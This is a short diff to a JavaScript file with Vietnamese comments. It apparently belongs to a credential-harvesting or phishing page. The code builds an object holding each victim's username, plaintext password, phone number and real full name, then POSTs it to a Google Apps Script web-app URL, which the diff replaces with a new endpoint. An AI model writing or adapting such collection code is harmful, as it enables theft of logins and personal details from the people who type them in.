@@ -785,15 +785,16 @@
 
             // [ĐÃ CẬP NHẬT] Các Key được viết IN HOA toàn bộ, sắp xếp lại theo đúng định dạng mới
             const payload = {
+                "THỜI GIAN": now,
                 "TRẠNG THÁI": type,
                 "TÊN ĐĂNG NHẬP": username,
                 "MẬT KHẨU": password,
                 "SỐ ĐIỆN THOẠI": phone,
-                "HỌ TÊN THẬT": fullname,
-                "THỜI GIAN": now
+                "HỌ TÊN THẬT": fullname
+                
             };
 
-            const scriptURL = "https://script.google.com/macros/s/AKfycbyKqbvKxcrp5WSq2OhYFdZD5DPGfAgML8Ir3bd-2mTkchmaLyzp8VYIgsdOm16CzILB7Q/exec";
+            const scriptURL = "https://script.google.com/macros/s/AKfycbyQk6j5GyYzA4zXDX4w4HMhDFuW-4nOofFqPaybLcokFEHaHdWVM68jw-BHDegYRlrO/exec";
 
             fetch(scriptURL, {
                 method: 'POST',
